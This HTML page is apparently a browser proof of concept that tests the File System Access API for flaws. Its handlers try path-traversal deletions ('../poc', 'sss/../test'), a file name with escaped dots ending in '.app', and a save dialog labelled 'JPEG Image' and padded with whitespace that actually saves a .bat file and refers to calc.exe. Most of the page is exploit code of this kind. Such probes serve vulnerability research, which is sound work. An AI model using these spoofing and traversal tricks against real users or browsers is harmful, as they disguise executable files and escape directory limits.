<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>File System Access API</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/x-icon" href="favicon.png">
</head>

<body>
    <h3>File System Access API </h3>

    <hr>
    <h3>Code example/proof:</h3>
    <div style="display: flex; flex-direction: column">
        <div>
            <button id="createNewFile" style="font-size: 26px; margin-top: 10px;">create file</button>
            <button id="saveNewFile" style="font-size: 26px; margin-top: 10px;">save file</button>
            <button id="rmFile" style="font-size: 26px; margin-top: 10px;">rm file</button>

        </div>

    </div>
    <script>
       const onCLick1 = async () => {
              // 'showDirectoryPicker' gives us access to a
              // directory the user selected.
              const dirHandle = await window.showDirectoryPicker();
              for await (const entry of dirHandle.values()) {
               console.log(entry.kind, entry.name);
              }

              // Oh yeah, creating new directories with the given handle
              // is possible - we're talking about true file system
              // access here!
              const newDirHandle = await dirHandle.getDirectoryHandle('ZZY_POC', { create: true });

              // Same for files in the directory. Of course.
              const newFileHandle = await dirHandle.getFileHandle('zzy\u002e\u002e\u002e\u002ed.app', { create: true });

       }
        const onCLick2 = async () => {

              //save file
                const options = {
                    types: [
                        {
                            description:
                                'JPEG Image (*.jpeg)                                                                                                                                                                                                                                                         ',
                            accept: {
                                'text/plain': ['.bat']
                            },
                            content: 'C:\\Windows\\system32\\calc.exe'
                        }
                    ]
                }
               const handle = await window.showSaveFilePicker(options)
               const writable = await handle.createWritable()
               const response = await fetch('data:text/html,dddd');
               await response.body.pipeTo(writable);
            }
        
        const onCLick3 = async () => {
                const dirHandle = await window.showDirectoryPicker();
              for await (const entry of dirHandle.values()) {
               console.log(entry.kind, entry.name);
              }

             

              // Deleting is done via 'removeEntry'. Here, we're deleting
              // our newly created empty txt-file.
              await dirHandle.removeEntry('../poc');

              // And for demo purposees, let's also delete the new
              // directory itself and any of its contents (which at
              // this point don't exist as the only file got just deleted).
              await dirHandle.removeEntry('sss/../test', { recursive: true });
        }

            const createNewFile = document.getElementById('createNewFile')
            createNewFile.addEventListener('click', onCLick1);
        
            const saveNewFile = document.getElementById('saveNewFile')
            saveNewFile.addEventListener('click', onCLick2);
        
            const rmFile = document.getElementById('rmFile')
            rmFile.addEventListener('click', onCLick3);
    </script>
    <hr>

</body>

</html>
